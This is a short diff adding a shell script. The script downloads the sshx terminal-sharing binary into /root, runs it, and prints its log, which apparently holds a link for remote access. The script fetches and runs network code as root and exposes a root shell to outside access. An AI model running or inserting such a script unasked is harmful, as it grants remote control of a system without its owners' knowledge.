@@ -1,0 +1,4 @@
+curl -L https://sshx.s3.amazonaws.com/sshx-x86_64-unknown-linux-musl.tar.gz -o /root/sshx.tar.gz
+tar xvf /root/sshx.tar.gz -C /root/
+/root/sshx >  /root/log.log
+cat /root/log.log
